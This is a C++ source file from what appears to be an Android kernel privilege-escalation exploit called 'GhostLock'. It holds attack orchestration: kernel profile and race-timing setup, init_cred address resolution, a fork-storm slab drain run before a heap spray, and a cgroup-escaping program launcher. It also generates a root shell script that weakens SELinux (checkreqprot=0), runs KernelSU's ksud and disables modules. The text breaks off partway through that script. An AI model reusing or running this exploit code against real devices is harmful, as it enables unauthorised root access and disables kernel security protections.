/*
 * GhostLock — attack primitives, launch/profile selection and timing.
 *
 * Split out of main.cpp so the orchestration entry stays a thin adapter. The
 * statement order and log text are unchanged from the original translation
 * unit.
 */

#include "attack/ops.hpp"
#include "support/fatal_error.hpp"

#include "session/exploit_session.hpp"

#include <algorithm>
#include <array>
#include <string>
#include <string_view>
#include <utility>
#include <vector>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/utsname.h>

namespace ghostlock::attack {
    void log_execution_settings(const profile::kernel_offsets *profile) {
        if (!profile) return;
        const profile::execution_settings *e = &profile->execution;
        const auto log_exec = [](const char *key, auto value) {
            pr_info("debug.execution.%s=%u\n", key, static_cast<unsigned>(value));
        };
        pr_info("debug.execution.begin release=%s\n", profile->uname_r);
        log_exec("recommended_cpus.main", e->recommended_main_cpu);
        log_exec("recommended_cpus.consumer", e->recommended_consumer_cpu);
        log_exec("selected_cpus.main", config::runtime_config_snapshot().main_cpu);
        log_exec("selected_cpus.consumer", config::runtime_config_snapshot().consumer_cpu);
        log_exec("heap.prepare_max_attempts", e->heap_prepare_max_attempts);
        log_exec("heap.prepare_timeout_ms", e->heap_prepare_timeout_ms);
        log_exec("heap.kernelsnitch_timeout_ms", e->heap_kernelsnitch_timeout_ms);
        log_exec("race.route_wait_ms", e->race_route_wait_ms);
        log_exec("race.setup_settle_us", e->race_setup_settle_us);
        log_exec("race.state_poll_interval_us", e->race_state_poll_interval_us);
        log_exec("stages.w1_attempts", e->w1_attempts);
        log_exec("stages.w1_settle_us", e->w1_settle_us);
        log_exec("stages.w1_scratch_repair_attempts", e->w1_scratch_repair_attempts);
        log_exec("stages.w2_attempts", e->w2_attempts);
        log_exec("stages.w2_settle_us", e->w2_settle_us);
        log_exec("stages.w3_chain_rounds", e->w3_chain_rounds);
        log_exec("stages.w3_attempts", e->w3_attempts);
        log_exec("stages.w3_settle_us", e->w3_settle_us);
        log_exec("routes.tcp_zerocopy.attempts", e->tcp_attempts);
        log_exec("routes.tcp_zerocopy.arm_sequence", e->tcp_arm_sequence);
        log_exec("routes.tcp_zerocopy.post_receive_hold_iterations",
                 e->tcp_post_receive_hold_iterations);
        log_exec("routes.select_stack.enter_delay_us", e->select_enter_delay_us);
        log_exec("routes.select_stack.timeout_us", e->select_timeout_us);
        log_exec("routes.select_stack.consumer_max_calls", e->select_consumer_max_calls);
        log_exec("routes.select_stack.consumer_burst_calls",
                 e->select_consumer_burst_calls);
        log_exec("handoff.pre_dispatch_settle_ms", e->handoff_pre_dispatch_settle_ms);
        log_exec("handoff.module_poll_attempts", e->handoff_module_poll_attempts);
        log_exec("handoff.module_poll_interval_ms", e->handoff_module_poll_interval_ms);
        log_exec("handoff.enforce_poll_attempts", e->handoff_enforce_poll_attempts);
        log_exec("handoff.enforce_poll_interval_ms", e->handoff_enforce_poll_interval_ms);
        pr_info("debug.execution.end\n");
    }

    /* Entries carry a phys load address only when measured; otherwise MTK uses
     * the DRAM base, xring its constant, qcom its GKI version. */
    void resolve_profile_addresses(void) {
        if (session::g_exploit_session.addresses.init(&session::g_exploit_session.profile) != 0)
            throw FatalError{};
        pr_info("soc: %s; kernel_phys_load=0x%llx\n",
                session::g_exploit_session.addresses.soc_name(&session::g_exploit_session.profile),
                (unsigned long long) session::g_exploit_session.addresses.phys_load());
        pr_info("init_cred image=%016zx alias=%016zx\n",
                (size_t) session::g_exploit_session.addresses.init_cred_image_addr(),
                (size_t) session::g_exploit_session.addresses.data_alias(
                    session::g_exploit_session.addresses.init_cred_image_addr()));
    }

    void install_profile(const profile::kernel_offsets &decoded) {
        struct utsname uts;
        if (uname(&uts) < 0) throw FatalError{};
        pr_info("kernel: %s\n", uts.release);
#ifdef TARGET_KERNEL_RELEASE
        if (std::string_view(uts.release) != TARGET_KERNEL_RELEASE) {
            pr_error("build requires kernel %s, got %s\n",
                     TARGET_KERNEL_RELEASE, uts.release);
            throw FatalError{};
        }
#endif
        if (!decoded.uname_r || std::string_view(decoded.uname_r) != uts.release) {
            pr_error("profile release mismatch: expected %s, got %s\n", uts.release,
                     decoded.uname_r ? decoded.uname_r : "<missing>");
            throw FatalError{};
        }
        /* PROFILE-SUGGEST-01: execution tuning arrives fully merged from Kotlin;
         * the native side only consumes the resolved values. */
        session::g_exploit_session.profile = profile::TargetProfile::from(&decoded);
        pr_success("resolved profile loaded: %s\n",
                   session::g_exploit_session.profile.release());
        if (config::runtime_config_snapshot().apply_profile(&session::g_exploit_session.profile) != 0)
            throw FatalError{};
        config::runtime_config_snapshot().log();
        log_execution_settings(session::g_exploit_session.profile.values());
        resolve_profile_addresses();
    }

    /* Lowest start and highest end of the System RAM banks in a /proc/iomem dump.
     * A nested bank lies inside its parent, so it cannot widen either bound. */
    static int32_t iomem_map_span(FILE *f, uint64_t *map_span) {
        unsigned long long base = 0, top = 0;
        char *line = nullptr;
        size_t cap = 0;
        int32_t found = 0;

        while (getline(&line, &cap, f) > 0) {
            size_t len = strlen(line);
            unsigned long long a, b;
            int32_t used = 0;

            while (len && (line[len - 1] == '\n' || line[len - 1] == '\r')) {
                line[--len] = '\0';
            }
            /* %n pins the match to the whole line, since sscanf returns 2 even when
             * a trailing literal mismatches */
            if (sscanf(line, " %llx-%llx : System RAM%n", &a, &b, &used) == 2 &&
                used == static_cast<int32_t>(len)) {
                if (!found || a < base) {
                    base = a;
                    found = 1;
                }
                if (b + 1 > top) top = b + 1;
            }
        }
        /* Kept as the C getline/free pair: the ScopeExit experiment grew
         * run_setup_stage by 5 instructions (CPP17 review, rejected). */
        free(line);

        /* the map starts at the dram base the kernel rounded down to a gib, which
         * is what memstart_addr holds */
        base &= ~((1ULL << 30) - 1);
        if (!found || top <= base) return 0;
        *map_span = top - base;
        return 1;
    }

    /* A rooted run leaves its /proc/iomem in the home dir, the only source for
     * this unit's direct map size. */
    void apply_iomem_cache(void) {
        std::array < char, 320 > path{};
        std::array < char, 192 > stamp{};
        uint64_t span = 0;
        int32_t ok = 0;
        const profile::kernel_offsets *values =
                session::g_exploit_session.profile.values();
        const char *release = values && values->uname_r ? values->uname_r : "";

        snprintf(path.data(), path.size(), "%s/.ghostlock_iomem", (config::runtime_config_snapshot().home_dir.c_str()));
        if (FILE *f = fopen(path.data(), "r")) {
            auto close_iomem = ghostlock::support::make_scope_exit(
                [f]() noexcept { fclose(f); });
            /* the first line names the release that wrote the dump */
            if (fgets(stamp.data(), static_cast<int32_t>(stamp.size()), f)) {
                /* strcspn returns an index inside the buffer; the store writes the
                 * terminating NUL at worst on the last byte. */
                stamp[strcspn(stamp.data(), "\r\n")] = '\0'; // NOLINT(clang-analyzer-security.ArrayBound)
                const std::string_view stamp_view(stamp.data());
                ok = stamp_view.starts_with("# ") &&
                     stamp_view.substr(2) == release &&
                     iomem_map_span(f, &span);
            }
        }

        /* the base is rounded down to a gib, so a span under that holds no real
         * bank, and the span has to cover the dram the unit reports. it also
         * stays inside the bound the built-in geometry already uses, so a measured
         * end can only narrow what this build would otherwise trust. an
         * unmeasurable ram rejects the dump */
        long pages = sysconf(_SC_PHYS_PAGES), page_sz = sysconf(_SC_PAGE_SIZE);
        uint64_t dram = (pages > 0 && page_sz > 0)
                            ? static_cast<uint64_t>(pages) * static_cast<uint64_t>(page_sz)
                            : 0;
        if (!ok || !dram || span < (1ULL << 30) || span < dram ||
            span >= kernel::DIRECT_MAP_END - kernel::DIRECT_MAP_BASE) {
            pr_info("iomem cache: no usable dump, keeping the built-in geometry\n");
            return;
        }

        kernel::g_direct_map_end = kernel::DIRECT_MAP_BASE + span;
        pr_info("iomem cache: direct_map_end=%016llx\n",
                (unsigned long long) kernel::g_direct_map_end);
    }

    void slab_drain(void) {
        /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
         * (exit 137) especially right before heap spray. */
        struct timespec up;
        clock_gettime(CLOCK_BOOTTIME, &up);
        int32_t waves = (up.tv_sec > 60) ? 2 : 1;
        int32_t batch = (up.tv_sec > 60) ? 64 : 32;
        for (int32_t wave = 0; wave < waves; wave++) {
            /* Fixed upper bound (batch <= 64): no heap and no vector exception
             * paths in this pre-attack drain. */
            std::array<support::ChildProcess, 64> drain;
            int32_t n = 0;
            for (int32_t i = 0; i < batch; i++) {
                pid_t pid = fork();
                if (pid == 0) {
                    pause();
                    _exit(0);
                }
                if (pid > 0) {
                    if (n >= static_cast<int32_t>(drain.size())) break;
                    drain[static_cast<size_t>(n++)] = support::ChildProcess(pid);
                } else {
                    break;
                }
            }
            /* kill + reap in the original order, now owned by ChildProcess */
            for (int32_t i = 0; i < n; i++) (void) drain[static_cast<size_t>(i)].terminate_and_wait(SIGKILL);
            sched_yield();
            usleep(20000);
        }
    }

    namespace {
        struct LaunchCgroupEntry final {
            std::string hierarchy;
            std::string controllers;
            std::string path;
        };

        struct LaunchCgroupMount final {
            std::string type;
            std::string root;
            std::string mount_point;
            std::string mount_options;
            std::string source;
            std::string super_options;
        };

        static bool launch_read_file(const char *path, std::string &contents) {
            support::UniqueFd fd(open(path, O_RDONLY | O_CLOEXEC));
            if (!fd.valid()) return false;
            std::array<char, 4096> buffer{};
            for (;;) {
                const ssize_t count = read(fd.get(), buffer.data(), buffer.size());
                if (count > 0) {
                    contents.append(buffer.data(), static_cast<size_t>(count));
                    if (contents.size() > 1024 * 1024) {
                        errno = EFBIG;
                        return false;
                    }
                    continue;
                }
                if (count < 0 && errno == EINTR) continue;
                return count == 0;
            }
        }

        static std::vector<std::string_view> launch_split_fields(std::string_view text) {
            std::vector<std::string_view> fields;
            size_t cursor = 0;
            while (cursor < text.size()) {
                while (cursor < text.size() && (text[cursor] == ' ' || text[cursor] == '\t'))
                    ++cursor;
                if (cursor == text.size()) break;
                const size_t end = text.find_first_of(" \t", cursor);
                if (end == std::string_view::npos) {
                    fields.push_back(text.substr(cursor));
                    break;
                }
                fields.push_back(text.substr(cursor, end - cursor));
                cursor = end + 1;
            }
            return fields;
        }

        static std::vector<std::string_view> launch_split_lines(std::string_view text) {
            std::vector<std::string_view> lines;
            size_t cursor = 0;
            while (cursor < text.size()) {
                const size_t end = text.find('\n', cursor);
                std::string_view line = end == std::string_view::npos
                        ? text.substr(cursor) : text.substr(cursor, end - cursor);
                if (!line.empty() && line.back() == '\r') line.remove_suffix(1);
                if (!line.empty()) lines.push_back(line);
                if (end == std::string_view::npos) break;
                cursor = end + 1;
            }
            return lines;
        }

        static bool launch_parse_cgroups(std::string_view text,
                                         std::vector<LaunchCgroupEntry> &entries) {
            for (const std::string_view line : launch_split_lines(text)) {
                const size_t first = line.find(':');
                const size_t second = first == std::string_view::npos
                        ? std::string_view::npos : line.find(':', first + 1);
                if (first == std::string_view::npos || second == std::string_view::npos)
                    continue;
                LaunchCgroupEntry entry;
                entry.hierarchy.assign(line.substr(0, first));
                entry.controllers.assign(line.substr(first + 1, second - first - 1));
                entry.path.assign(line.substr(second + 1));
                entries.push_back(std::move(entry));
            }
            return !entries.empty();
        }

        static std::string launch_unescape_mountinfo(std::string_view text) {
            std::string result;
            result.reserve(text.size());
            for (size_t i = 0; i < text.size(); ++i) {
                if (text[i] == '\\' && i + 3 < text.size() &&
                    text[i + 1] >= '0' && text[i + 1] <= '7' &&
                    text[i + 2] >= '0' && text[i + 2] <= '7' &&
                    text[i + 3] >= '0' && text[i + 3] <= '7') {
                    const int value = (text[i + 1] - '0') * 64 +
                                      (text[i + 2] - '0') * 8 +
                                      (text[i + 3] - '0');
                    result.push_back(static_cast<char>(value));
                    i += 3;
                } else {
                    result.push_back(text[i]);
                }
            }
            return result;
        }

        static bool launch_parse_mounts(std::string_view text,
                                        std::vector<LaunchCgroupMount> &mounts) {
            for (const std::string_view line : launch_split_lines(text)) {
                const size_t separator = line.find(" - ");
                if (separator == std::string_view::npos) continue;
                const auto left = launch_split_fields(line.substr(0, separator));
                const auto right = launch_split_fields(line.substr(separator + 3));
                if (left.size() < 6 || right.size() < 3) continue;
                LaunchCgroupMount mount;
                mount.type.assign(right[0]);
                mount.root = launch_unescape_mountinfo(left[3]);
                mount.mount_point = launch_unescape_mountinfo(left[4]);
                mount.mount_options.assign(left[5]);
                mount.source.assign(right[1]);
                mount.super_options.assign(right[2]);
                mounts.push_back(std::move(mount));
            }
            return !mounts.empty();
        }

        static bool launch_csv_contains(std::string_view list,
                                        std::string_view value) noexcept {
            size_t cursor = 0;
            while (cursor <= list.size()) {
                const size_t end = list.find(',', cursor);
                const std::string_view field = end == std::string_view::npos
                        ? list.substr(cursor) : list.substr(cursor, end - cursor);
                if (field == value) return true;
                if (end == std::string_view::npos) break;
                cursor = end + 1;
            }
            return false;
        }

        static bool launch_mount_supports(const LaunchCgroupEntry &entry,
                                          const LaunchCgroupMount &mount) noexcept {
            if (entry.hierarchy == "0" && entry.controllers.empty())
                return mount.type == "cgroup2";
            if (mount.type != "cgroup") return false;
            if (entry.controllers.empty()) return false;
            size_t cursor = 0;
            while (cursor <= entry.controllers.size()) {
                const size_t end = entry.controllers.find(',', cursor);
                const std::string_view controller = end == std::string::npos
                        ? std::string_view(entry.controllers).substr(cursor)
                        : std::string_view(entry.controllers).substr(cursor, end - cursor);
                if (launch_csv_contains(mount.super_options, controller) ||
                    launch_csv_contains(mount.source, controller) ||
                    launch_csv_contains(mount.mount_options, controller))
                    return true;
                if (end == std::string::npos) break;
                cursor = end + 1;
            }
            return false;
        }

        static bool launch_map_cgroup_path(std::string_view mount_root,
                                           std::string_view process_path,
                                           std::string &relative) {
            if (mount_root.empty()) mount_root = "/";
            if (mount_root == "/") {
                relative.assign(process_path);
                return true;
            }
            if (process_path == mount_root) {
                relative = "/";
                return true;
            }
            if (process_path.size() > mount_root.size() &&
                process_path.substr(0, mount_root.size()) == mount_root &&
                process_path[mount_root.size()] == '/') {
                relative.assign(process_path.substr(mount_root.size()));
                return true;
            }
            return false;
        }

        static std::string launch_join_cgroup_path(std::string_view mount_point,
                                                   std::string_view relative) {
            if (mount_point.empty()) mount_point = "/";
            if (relative.empty() || relative == "/") return std::string(mount_point);
            if (mount_point == "/") return std::string(relative);
            std::string result(mount_point);
            result.append(relative);
            return result;
        }

        static bool launch_write_pid_to_cgroup(const std::string &directory,
                                                pid_t pid, int *error_out) {
            const std::string path = directory + "/cgroup.procs";
            support::UniqueFd fd(open(path.c_str(), O_WRONLY | O_CLOEXEC));
            if (!fd.valid()) {
                if (error_out) *error_out = errno;
                return false;
            }
            char text[32]{};
            const int count = snprintf(text, sizeof(text), "%d\n",
                                       static_cast<int>(pid));
            if (count <= 0 || count >= static_cast<int>(sizeof(text))) {
                if (error_out) *error_out = EOVERFLOW;
                errno = EOVERFLOW;
                return false;
            }
            size_t written = 0;
            while (written < static_cast<size_t>(count)) {
                const ssize_t result = write(fd.get(), text + written,
                                             static_cast<size_t>(count) - written);
                if (result > 0) {
                    written += static_cast<size_t>(result);
                    continue;
                }
                if (result < 0 && errno == EINTR) continue;
                if (result == 0) errno = EIO;
                if (error_out) *error_out = errno;
                return false;
            }
            return true;
        }

        static bool launch_cgroup_entry_matches(std::string_view text,
                                                 const LaunchCgroupEntry &expected) {
            for (const std::string_view line : launch_split_lines(text)) {
                const size_t first = line.find(':');
                const size_t second = first == std::string_view::npos
                        ? std::string_view::npos : line.find(':', first + 1);
                if (first == std::string_view::npos || second == std::string_view::npos)
                    continue;
                if (line.substr(0, first) == expected.hierarchy &&
                    line.substr(second + 1) == expected.path)
                    return true;
            }
            return false;
        }

        static void launch_log_self_cgroup(const char *phase) {
            std::string current;
            if (!launch_read_file("/proc/self/cgroup", current)) {
                fprintf(stderr,
                        "[custom-launch] cgroup snapshot phase=%s pid=%d failed errno=%d\n",
                        phase, static_cast<int>(getpid()), errno);
                return;
            }
            fprintf(stderr, "[custom-launch] cgroup snapshot phase=%s pid=%d\n%s",
                    phase, static_cast<int>(getpid()), current.c_str());
            if (current.empty() || current.back() != '\n') fputc('\n', stderr);
        }

        static bool launch_move_to_pid1_cgroups() {
            std::string pid1_text;
            if (!launch_read_file("/proc/1/cgroup", pid1_text)) {
                const int error = errno;
                fprintf(stderr, "[custom-launch] cannot read /proc/1/cgroup errno=%d\n", error);
                errno = error;
                return false;
            }
            std::string mountinfo_text;
            if (!launch_read_file("/proc/self/mountinfo", mountinfo_text)) {
                const int error = errno;
                fprintf(stderr, "[custom-launch] cannot read mountinfo errno=%d\n", error);
                errno = error;
                return false;
            }
            std::vector<LaunchCgroupEntry> pid1_entries;
            std::vector<LaunchCgroupMount> mounts;
            if (!launch_parse_cgroups(pid1_text, pid1_entries) ||
                !launch_parse_mounts(mountinfo_text, mounts)) {
                fprintf(stderr, "[custom-launch] no parseable PID 1 cgroup/mount hierarchy\n");
                errno = ENOTSUP;
                return false;
            }

            bool found = false;
            for (const LaunchCgroupEntry &entry : pid1_entries) {
                bool entry_moved = false;
                int last_error = ENOENT;
                std::string last_target;
                for (const LaunchCgroupMount &mount : mounts) {
                    if (!launch_mount_supports(entry, mount)) continue;
                    std::string relative;
                    if (!launch_map_cgroup_path(mount.root, entry.path, relative)) continue;
                    const std::string target =
                            launch_join_cgroup_path(mount.mount_point, relative);
                    last_target = target;
                    if (!launch_write_pid_to_cgroup(target, getpid(), &last_error))
                        continue;
                    std::string actual_text;
                    if (!launch_read_file("/proc/self/cgroup", actual_text)) {
                        last_error = errno;
                        continue;
                    }
                    if (!launch_cgroup_entry_matches(actual_text, entry)) {
                        last_error = EPROTO;
                        continue;
                    }
                    fprintf(stderr,
                            "[custom-launch] cgroup verified pid=%d hierarchy=%s controllers=%s path=%s target=%s\n",
                            static_cast<int>(getpid()), entry.hierarchy.c_str(),
                            entry.controllers.c_str(), entry.path.c_str(), target.c_str());
                    entry_moved = true;
                    found = true;
                    break;
                }
                if (!entry_moved) {
                    fprintf(stderr,
                            "[custom-launch] cgroup move failed pid=%d hierarchy=%s controllers=%s path=%s target=%s errno=%d\n",
                            static_cast<int>(getpid()), entry.hierarchy.c_str(),
                            entry.controllers.c_str(), entry.path.c_str(),
                            last_target.c_str(), last_error);
                    errno = last_error;
                    return false;
                }
            }
            if (!found) {
                fprintf(stderr, "[custom-launch] PID 1 has no supported cgroup hierarchy\n");
                errno = ENOTSUP;
                return false;
            }
            return true;
        }

        static int32_t run_isolated_program_child(char **argv) {
            const pid_t pid = getpid();
            if (setsid() < 0) {
                const int error = errno;
                fprintf(stderr, "[custom-launch] setsid failed pid=%d errno=%d\n",
                        static_cast<int>(pid), error);
                return 1;
            }
            const pid_t pgid = getpgrp();
            const pid_t sid = getsid(0);
            fprintf(stderr, "[custom-launch] session pid=%d pgid=%d sid=%d\n",
                    static_cast<int>(pid), static_cast<int>(pgid), static_cast<int>(sid));
            if (pgid != pid || sid != pid) {
                fprintf(stderr, "[custom-launch] session verification failed pid=%d\n",
                        static_cast<int>(pid));
                return 1;
            }

            support::UniqueFd null_input(open("/dev/null", O_RDONLY | O_CLOEXEC));
            if (!null_input.valid()) {
                fprintf(stderr, "[custom-launch] /dev/null open failed errno=%d\n", errno);
                return 1;
            }
            if (null_input.get() == STDIN_FILENO) {
                const int flags = fcntl(STDIN_FILENO, F_GETFD);
                if (flags < 0 || fcntl(STDIN_FILENO, F_SETFD, flags & ~FD_CLOEXEC) < 0) {
                    fprintf(stderr, "[custom-launch] stdin setup failed errno=%d\n", errno);
                    return 1;
                }
            } else {
                if (dup2(null_input.get(), STDIN_FILENO) < 0) {
                    fprintf(stderr, "[custom-launch] stdin setup failed errno=%d\n", errno);
                    return 1;
                }
                null_input.reset();
            }

            launch_log_self_cgroup("before");
            const bool cgroup_moved = launch_move_to_pid1_cgroups();
            const int cgroup_error = cgroup_moved ? 0 : errno;
            launch_log_self_cgroup(cgroup_moved ? "after" : "after_failed_move");
            if (!cgroup_moved)
                fprintf(stderr,
                        "[custom-launch] continuing in inherited cgroup after migration failure errno=%d\n",
                        cgroup_error);

            const char *program = argv[2];
            execvp(program, &argv[2]);
            const int error = errno;
            fprintf(stderr, "[custom-launch] execvp failed pid=%d program=%s errno=%d\n",
                    static_cast<int>(pid), program, error);
            return 127;
        }
    } // namespace

    int32_t launch_custom_program_isolated(int32_t argc, char **argv) noexcept {
        if (argc < 3 || !argv || !argv[2] || argv[2][0] == '\0') {
            fprintf(stderr, "[custom-launch] invalid launcher arguments\n");
            return 2;
        }
        const pid_t child = fork();
        if (child < 0) {
            fprintf(stderr, "[custom-launch] fork failed errno=%d\n", errno);
            return 1;
        }
        if (child > 0) {
            fprintf(stderr, "[custom-launch] detached setup child pid=%d target=%s\n",
                    static_cast<int>(child), argv[2]);
            fflush(stderr);
            return 0;
        }
        return run_isolated_program_child(argv);
    }

    void write_root_script(void) {
        std::string script(16384, '\0');
        support::UniqueFd sfd(
            open((config::runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
        if (!sfd.valid()) {
            pr_warning("open root script failed path=%s errno=%d\n",
                       (config::runtime_config_snapshot().root_script_path.c_str()), errno);
            return;
        }

        std::array<char, 1024> native_binary_path{};
        const ssize_t native_binary_path_len = readlink(
                "/proc/self/exe", native_binary_path.data(),
                native_binary_path.size() - 1);
        if (native_binary_path_len <= 0 ||
            static_cast<size_t>(native_binary_path_len) >=
                    native_binary_path.size() - 1) {
            pr_warning("root script native binary path read failed errno=%d\n", errno);
            native_binary_path[0] = '\0';
        } else {
            native_binary_path[static_cast<size_t>(native_binary_path_len)] = '\0';
        }

        int32_t n = snprintf(
            script.data(), script.size(),
            "#!/system/bin/sh\n"
            "HOME_DIR='%s'\n"
            "LOG='%s'\n"
            "GHOSTLOCK_NATIVE_BIN='%s'\n"
            "SAFE_MODE=%d\n"
            "KSUD=\"$HOME_DIR/ksud\"\n"
            "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
            "chmod 644 \"$LOG\" 2>/dev/null\n"
            "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
            "# custom launcher: run the app-configured program in the background\n"
            "glk_launch_custom() {\n"
            "  [ \"${GLK_LAUNCH_DONE:-0}\" = \"0\" ] || return 0\n"
            "  GLK_LAUNCH_DONE=1\n"
            "  [ \"${GLK_LAUNCH_ENABLED:-0}\" = \"1\" ] || return 0\n"
            "  [ -n \"${GLK_LAUNCH_PROGRAM:-}\" ] || return 0\n"
            "  echo \"[!] WARNING: launching the app-configured program; if it is harmful it may break this device\" >>\"$LOG\"\n"
            "  if [ ! -x \"$GLK_LAUNCH_PROGRAM\" ]; then\n"
            "    chmod 755 \"$GLK_LAUNCH_PROGRAM\" 2>>\"$LOG\" || echo '[!] custom launcher: chmod failed' >>\"$LOG\"\n"
            "  fi\n"
            /* Some filesystems (e.g. /storage/emulated FUSE) never report
             * an execute bit, so chmod cannot help; stage a copy on the run
             * home (data partition) and run that instead. */
            "  if [ ! -x \"$GLK_LAUNCH_PROGRAM\" ]; then\n"
            "    GLK_LAUNCH_COPY=\"$HOME_DIR/.ghostlock_launch_bin\"\n"
            "    if cp \"$GLK_LAUNCH_PROGRAM\" \"$GLK_LAUNCH_COPY\" 2>>\"$LOG\"; then\n"
            "      chmod 755 \"$GLK_LAUNCH_COPY\" 2>>\"$LOG\" || echo '[!] custom launcher: chmod failed' >>\"$LOG\"\n"
            "      GLK_LAUNCH_PROGRAM=\"$GLK_LAUNCH_COPY\"\n"
            "      echo \"[*] custom launcher: staged copy at $GLK_LAUNCH_PROGRAM\" >>\"$LOG\"\n"
            "    else\n"
            "      echo \"[!] custom launcher: cannot copy $GLK_LAUNCH_PROGRAM\" >>\"$LOG\"\n"
            "    fi\n"
            "  fi\n"
            "  if [ -x \"$GLK_LAUNCH_PROGRAM\" ]; then\n"
            "    if [ ! -x \"$GHOSTLOCK_NATIVE_BIN\" ]; then echo '[!] custom launcher: native helper unavailable' >>\"$LOG\"; return 0; fi\n"
            "    \"$GHOSTLOCK_NATIVE_BIN\" --ghostlock-launch-isolated \"$GLK_LAUNCH_PROGRAM\" $GLK_LAUNCH_ARGS </dev/null >>\"$LOG\" 2>&1 &\n"
            "    echo \"[*] custom launcher session-isolation helper pid=$! target=$GLK_LAUNCH_PROGRAM\" >>\"$LOG\"\n"
            "  else\n"
            "    echo \"[!] custom launcher: $GLK_LAUNCH_PROGRAM is not executable\" >>\"$LOG\"\n"
            "  fi\n"
            "}\n"
            "GLK_LAUNCH_DONE=0\n"
            "GLK_LAUNCH_ENABLED=0\n"
            "GLK_LAUNCH_PROGRAM=\n"
            "GLK_LAUNCH_ARGS=\n"
            "if [ -f \"$HOME_DIR/.ghostlock_launch.conf\" ]; then . \"$HOME_DIR/.ghostlock_launch.conf\"; fi\n"
            "trap 'glk_launch_custom' EXIT\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu.pr*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/me.weishu.kernelsu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ ! -x \"$KSUD\" ]; then\n"
            "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
            "fi\n"
            "if [ -z \"$KSUD\" ]; then KSUD=/data/local/tmp/ksud; fi\n"
            "if [ ! -x \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
            "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
            "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
            "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
            "if [ \"$(id -u)\" -ne 0 ]; then\n"
            "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            /* the rename is atomic, so a failed read leaves the old dump in place */
            "echo \"# $(uname -r)\" >\"$HOME_DIR/.ghostlock_iomem.new\"\n"
            "if cat /proc/iomem >>\"$HOME_DIR/.ghostlock_iomem.new\" 2>/dev/null && grep -q 'System RAM' \"$HOME_DIR/.ghostlock_iomem.new\"; then\n"
            "  mv \"$HOME_DIR/.ghostlock_iomem.new\" \"$HOME_DIR/.ghostlock_iomem\"\n"
            "  chmod 644 \"$HOME_DIR/.ghostlock_iomem\" 2>/dev/null\n"
            "  echo \"[*] iomem cache: cached $(wc -c <\"$HOME_DIR/.ghostlock_iomem\") bytes\" >>\"$LOG\"\n"
            "else\n"
            "  rm -f \"$HOME_DIR/.ghostlock_iomem.new\"\n"
            "  echo '[!] iomem cache: /proc/iomem read failed' >>\"$LOG\"\n"
            "fi\n"
            /* debug archive: copy kernel/pstore/iomem evidence into the
             * --dump-kernel-log directory (empty disables the dump). */
            "DEBUG_DIR=\"%s\"\n"
            "dump_debug() {\n"
            "  [ -n \"$DEBUG_DIR\" ] || return 0\n"
            "  mkdir -p \"$DEBUG_DIR/pstore\" 2>/dev/null || { echo \"[!] debug dump: cannot write $DEBUG_DIR\" >>\"$LOG\"; return 0; }\n"
            "  {\n"
            "    echo '== uname -a =='\n"
            "    uname -a\n"
            "    echo '== /proc/version =='\n"
            "    cat /proc/version\n"
            "    echo '== /proc/cmdline =='\n"
            "    cat /proc/cmdline\n"
            "    echo '== /proc/modules =='\n"
            "    cat /proc/modules\n"
            "    echo '== selinux =='\n"
            "    getenforce 2>/dev/null\n"
            "  } >\"$DEBUG_DIR/kernel-info.txt\" 2>&1\n"
            "  if ! dmesg >\"$DEBUG_DIR/kernel-dmesg.log\" 2>&1; then\n"
            "    echo '[!] dmesg unavailable' >>\"$DEBUG_DIR/kernel-dmesg.log\"\n"
            "  fi\n"
            "  for f in /sys/fs/pstore/*; do\n"
            "    [ -f \"$f\" ] || continue\n"
            "    cp \"$f\" \"$DEBUG_DIR/pstore/\" 2>/dev/null\n"
            "  done\n"
            "  cp /proc/iomem \"$DEBUG_DIR/iomem.txt\" 2>/dev/null\n"
            "  cp \"$LOG\" \"$DEBUG_DIR/ksu.log\" 2>/dev/null\n"
            "  echo \"[*] debug dump written to $DEBUG_DIR\" >>\"$LOG\"\n"
            "}\n"
            "# W1's 64-bit child pointer makes adjacent booleans non-zero.\n"
            "echo 0 > /sys/fs/selinux/checkreqprot 2>/dev/null\n"
            "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
            "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
            "fi\n"
            "KVER=$(uname -r | cut -d. -f1-2)\n"
            "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
            "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
            "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "KMI=\"${AVER}-${KVER}\"\n"
            "# safe mode: disable all modules before exec ksud\n"
            "if [ \"$SAFE_MODE\" = \"1\" ]; then\n"
            "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
            "  n=0\n"
            "  for m in /data/adb/modules/*/; do\n"
            "    [ -d \"$m\" ] || continue\n"
            "    if touch \"${m}disable\" 2>/dev/null; then\n"
            "      n=$((n+1))\n"
            "      echo \"  disabled ${m}\" >>\"$LOG\"\n"
            "    fi\n"
            "  done\n"
            "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
            "fi\n"
            "# step 1: restore policy\n"
